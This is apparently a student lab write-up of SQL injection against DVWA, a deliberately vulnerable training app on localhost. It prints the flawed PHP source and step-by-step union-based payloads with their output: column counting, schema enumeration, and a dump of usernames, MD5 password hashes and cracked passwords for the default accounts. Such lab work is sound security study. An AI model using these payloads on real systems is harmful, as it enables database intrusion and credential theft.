# DVWA SQL Injection Walkthrough — Low Security Level
Assignment 04 — SQL Injection Mastery

**Target Endpoint:** `http://localhost:8080/vulnerabilities/sqli/`  
**Security Level:** Low  
**Vulnerable Parameter:** `id` (GET request)

---

## 1. Vulnerability Analysis (Source Code Review)

```php
// Source in dvwa/vulnerabilities/sqli/source/low.php:
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
```

### Flaw Mechanics:
The `$id` variable is directly concatenated inside single quotes (`'$id'`). No input sanitization, type casting, or prepared statements are used.

---

## 2. Step-by-Step Exploitation Workflow

### Step 1: Detect SQL Injection Point
- **Payload:** `1'`
- **Observed Response:**
  ```html
  <pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</pre>
  ```
- **Analysis:** Single quote broke query syntax, confirming SQL injection point.

### Step 2: Determine Column Count via ORDER BY
- **Payload:** `1' ORDER BY 1 #` → OK (1 column exists)
- **Payload:** `1' ORDER BY 2 #` → OK (2 columns exist)
- **Payload:** `1' ORDER BY 3 #` → Error: `Unknown column '3' in 'order clause'`
- **Conclusion:** The original query selects exactly **2 columns**.

### Step 3: Determine Reflection Positions via UNION SELECT
- **Payload:** `1' UNION SELECT 1, 2 #`
- **Observed Response:**
  ```html
  ID: 1' UNION SELECT 1, 2 #
  First name: admin
  Surname: admin
  First name: 1
  Surname: 2
  ```
- **Conclusion:** Both column 1 and column 2 are reflected back to the HTML page.

### Step 4: Extract Database Metadata
- **Payload:** `1' UNION SELECT database(), user() #`
- **Extracted Data:**
  - Database: `dvwa`
  - User: `dvwa@localhost` (or `app@172.28.0.x`)

### Step 5: Enumerate Tables in Schema
- **Payload:**
  ```sql
  1' UNION SELECT null, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() #
  ```
- **Extracted Data:** `guestbook,users`

### Step 6: Enumerate Column Names in `users` Table
- **Payload:**
  ```sql
  1' UNION SELECT null, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' #
  ```
- **Extracted Data:** `user_id,first_name,last_name,user,password,avatar,last_login,failed_login`

### Step 7: Dump Usernames and Password Hashes
- **Payload:**
  ```sql
  1' UNION SELECT null, GROUP_CONCAT(user, 0x3a, password SEPARATOR 0x3c62723e) FROM users #
  ```
- **Extracted Data:**
  - `admin:5f4dcc3b5aa765d61d8327deb882cf99` (MD5: `password`)
  - `gordonb:e99a18c428cb38d5f260853678922e03` (MD5: `abc123`)
  - `1337:8d3533d75ae2c39466db0afdb602b88b` (MD5: `charley`)
  - `pablo:0d107d09f5bbe40ade3de5da94e5d4f8` (MD5: `letmein`)
  - `smithy:5f4dcc3b5aa765d61d8327deb882cf99` (MD5: `password`)
